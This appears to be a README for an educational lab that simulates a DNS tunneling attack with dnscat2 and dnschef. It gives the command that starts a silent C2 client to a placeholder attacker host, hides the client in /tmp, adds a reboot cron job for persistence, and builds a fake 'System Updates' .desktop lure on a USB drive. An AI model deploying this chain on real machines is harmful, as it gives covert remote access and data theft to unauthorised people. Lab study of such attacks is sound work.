# DNS Tunneling Attack Simulation

This project simulates a DNS Tunneling attack using:

- **dnscat2** for command-and-control over DNS
- **dnschef** for simulating a fake DNS server
- A **malware script** as payload
- **autorun.desktop** to simulate real-world autorun behavior

## Structure

- `/setup`:
 ### A virtual lab was created using VMware with two machines:
  #### Attacker (Kali Linux 2023.1):
  -Hosts dnscat2 (C2 server) and dnschef (fake DNS server).
  #### Victim (Ubuntu 20.04):
  -Simulates a compromised system communicating via DNS tunneling.
  
- `/dnschef`: Configuration for fake DNS domain
### The attacker machine (Kali Linux) uses dnschef, a rogue DNS proxy, to intercept DNS queries from the victim.
  -Purpose: Redirect DNS queries for a fake domain to the attacker's IP, enabling covert C2 communication.

  ```bash
    sudo apt install dnschef -y
```
  
```bash
   sudo dnschef --fakeip 192.168.163.143 -q
```     
  -Listener Port: 53 (standard DNS)

  -Behavior: Replies to DNS queries with the attacker's IP instead of resolving them, enabling the victim to unknowingly connect to the dnscat2 server.
     
- `/dnscat2`: 🧠 dnscat2 C2 Server Setup
  To complete the DNS tunneling setup, the attacker's environment includes running both the **dnscat2 C2 server** and the **dnschef fake DNS server** in parallel.
 ### ⚙️ dnscat2 Installation & Setup
 -Installs Ruby
 ```bash
   sudo apt install ruby git -y
```    
 -Clones the dnscat2 repository from GitHub to your local machine.
    
``` bash
  git clone https://github.com/iagox86/dnscat2.git
```    
 -Change directory to the dnscat2 server folder and Installs Ruby's dependency manager Bundler
    
```bash
 cd dnscat2/server
 sudo gem install bundler
```    
 -installs any required Ruby gems defined in the Gemfile
    ```bash
    sudo bundle install 
    ```
   ![image](https://github.com/user-attachments/assets/3434ca66-218e-414c-b7f3-24b3a0abca4e)
    
 -Launches the dnscat2 server, enabling it to listen for DNS queries and manage inbound communication.
  ```bash
    ruby ./dnscat2.rb
 ```
   ![image](https://github.com/user-attachments/assets/b6bb6cac-e639-4358-b740-28270d4a04f6)
    
   (‼️ Important: Both the dnscat2 server and dnschef must run simultaneously)
   
- `/malware`: 🐛 Malware Creation and Deployment
A custom Bash script (`malware.sh`) was developed to simulate real-world malware behavior using DNS tunneling for covert Command and Control (C2) communication.

   ![image](https://github.com/user-attachments/assets/bb7d4a97-c78d-40bf-bebf-fd17233af4a3)

 ### 🔒 Stealthy Deployment
  -Copies the `dnscat2` client to a hidden path: `/tmp/.dns-update`
  -Sets execution permissions for silent execution
 ### 🌐 C2 Initialization
  -Establishes a DNS-based C2 channel to the attacker's server over **UDP port 53**
  -Launches the client using:
  ./dnscat --dns server=<KALI_IP>,port=53 --secret=mysecret >/dev/null 2>&1
 ### ♻️ Persistence
   -Adds a cron job with @reboot to ensure the malware runs on every system startup
 ### 💾 Infection Method:
   -Delivered via USB drive
   
- `/Autorun`:💾 USB-Based Delivery via `.desktop` File
  A fake `.desktop` file is used to trick users into executing a malicious script (`malware.sh`) from a USB drive. This method simulates social engineering by mimicking a legitimate system update.
### 🧿 File Example: `System Autorun.desktop`

   ![image](https://github.com/user-attachments/assets/d376af3e-9704-4379-ae58-f985797e7dbc)

-Name=System Updates: Displays a trusted label to trick the user.

-Exec=/bin/bash /media/$USER/USB/malware.sh :Executes the hidden script from the USB.

-Icon=system-software-update: Uses a familiar system icon to avoid suspicion.

-Type=Application: Treated as an executable app.

-Terminal=false: Runs silently without opening a terminal window.
    
- `/tunnel execution`: 🎯 Execution and Session Establishment
  
  -When the victim clicks the malicious .desktop file, malware.sh is executed.
  -This triggers a DNS tunnel connection to the attacker's dnscat2 C2 server.
  -A stealthy session is created, giving the attacker remote shell access.
  
   ![image](https://github.com/user-attachments/assets/ddb593fb-d9d8-4806-aea1-7439cdf3c076)

-`/result_screen shoots`:🛠 Post-Execution Actions
### Attacker can now:
  -Run remote commands
  -Monitor user activity
  -Extract sensitive data
  
   ![image](https://github.com/user-attachments/assets/92ff7011-2ee0-4a54-ae2f-08feefc32e81)

   ![image](https://github.com/user-attachments/assets/0dc1c90a-b731-422f-9393-9239207e2e55)

   ![image](https://github.com/user-attachments/assets/f7583d55-734f-4987-b58c-1a2794e56f8b)

   ![image](https://github.com/user-attachments/assets/4a8df170-2232-41c5-ac18-2efb355f1991)

   ![image](https://github.com/user-attachments/assets/4bfa987e-5d3a-480e-824e-80595ca2ea00)

   ![image](https://github.com/user-attachments/assets/a8bac9d6-28bb-403a-be7f-ba206d0ed789)
   
   ![image](https://github.com/user-attachments/assets/be0fc7a7-7857-43f1-a04e-0635634b9e0a)
   
  ![image](https://github.com/user-attachments/assets/a3baf20d-ce75-4fd7-a715-cd4706eccf8d)

  ![image](https://github.com/user-attachments/assets/ea02f761-961a-408e-bf22-596916e91812)


## How to Run (For Educational Use Only)

> ⚠️ Warning: This is for **educational and testing purposes** only. Do not use in unauthorized environments.

1. Start `dnschef` with a fake domain.
2. Launch `dnscat2-server`.
3. Place the `autorun.desktop` on the target and simulate execution.
4. The Ruby malware connects back to the `dnscat2` server.
5. You can exfiltrate data or run commands from the server.

## Legal Notice

This project is strictly for **educational purposes** and **authorized testing labs**. Do not deploy in live or unauthorized environments.
